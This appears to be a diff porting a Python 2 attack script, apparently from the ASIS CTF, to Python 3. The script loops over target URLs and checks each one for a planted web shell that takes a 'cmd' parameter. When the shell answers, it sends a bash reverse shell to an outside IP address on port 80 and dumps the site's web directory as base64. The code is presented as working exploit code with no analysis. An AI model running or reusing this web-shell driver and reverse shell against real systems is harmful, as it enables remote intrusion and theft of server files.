@@ -2,7 +2,7 @@ urls = 'https://binarycloud.asis-ctf.ir/cache/index.php https://binarycloud.asis
 
 import requests
 from time import sleep
-from urllib  import quote 
+from urllib.parse  import quote
 
 from time import localtime, strftime
 def timestamp():
@@ -11,8 +11,8 @@ def timestamp():
 def run(url, cmd):
     u = '%s?cmd=%s' % (url, quote(cmd))
     r = requests.get(u)
-    print '%s' % timestamp
-    print '%r' % r.content
+    print('%s' % timestamp)
+    print('%r' % r.content)
 
 
 while True:
@@ -20,7 +20,7 @@ while True:
         u = '%s?cmd=id' % url
         r = requests.get(u)
         if 'uid=' in r.content:
-            print 'Woot %s %r' % (u, r.content)
+            print('Woot %s %r' % (u, r.content))
 
             run(url, 'bash -i >& /dev/tcp/212.83.174.121/80 0>&1')
             run(url, 'tar cf - /home/binarycloud/www|base64')
